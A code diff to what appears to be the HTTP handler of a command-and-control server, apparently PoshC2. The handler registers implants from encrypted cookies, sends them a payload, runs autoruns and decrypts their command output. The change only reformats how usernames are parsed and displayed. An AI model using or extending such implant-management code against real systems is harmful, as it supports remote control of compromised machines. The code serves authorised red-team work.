@@ -155,7 +155,10 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             decCookie = decrypt(KEY, cookieVal)
             IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
             Domain,User,Hostname,Arch,PID,Proxy = decCookie.split(";")
-            newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"), User.decode("utf-8"), Hostname.decode("utf-8"), Arch, PID, Proxy)
+            user = User.decode("utf-8")
+            if "\\" in user:
+              user = user[user.index("\\") + 1:]
+            newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"), user, Hostname.decode("utf-8"), Arch, PID, Proxy)
             newImplant.save()
             newImplant.display()
             responseVal = encrypt(KEY, newImplant.SharpCore)
@@ -184,7 +187,10 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
               decCookie = decrypt(KEY, cookieVal)
               Domain,User,Hostname,Arch,PID,Proxy = decCookie.split(";")
               IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
-              newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"),User.decode("utf-8"), Hostname.decode("utf-8"), Arch, PID, Proxy)
+              user = User.decode("utf-8")
+              if "\\" in user:
+                user = user[user.index('\\') + 1:]
+              newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"),user, Hostname.decode("utf-8"), Arch, PID, Proxy)
               newImplant.save()
               newImplant.display()
               newImplant.autoruns()
@@ -229,10 +235,11 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             Hostname = i[3]
             encKey = i[5]
             Domain = i[11]
+            User = i[2]
             if RandomURI in s.path and cookieVal:
               decCookie = decrypt(encKey, cookieVal)
               print (Colours.GREEN)
-              print ("Command returned against implant %s on host %s %s (%s)" % (implantID,Hostname,Domain,now.strftime("%m/%d/%Y %H:%M:%S")))
+              print ("Command returned against implant %s on host %s\\%s @ %s (%s)" % (implantID, Domain, User, Hostname,now.strftime("%m/%d/%Y %H:%M:%S")))
               #print decCookie,Colours.END
               rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
               outputParsed = re.sub(r'123456(.+?)654321', '', rawoutput)
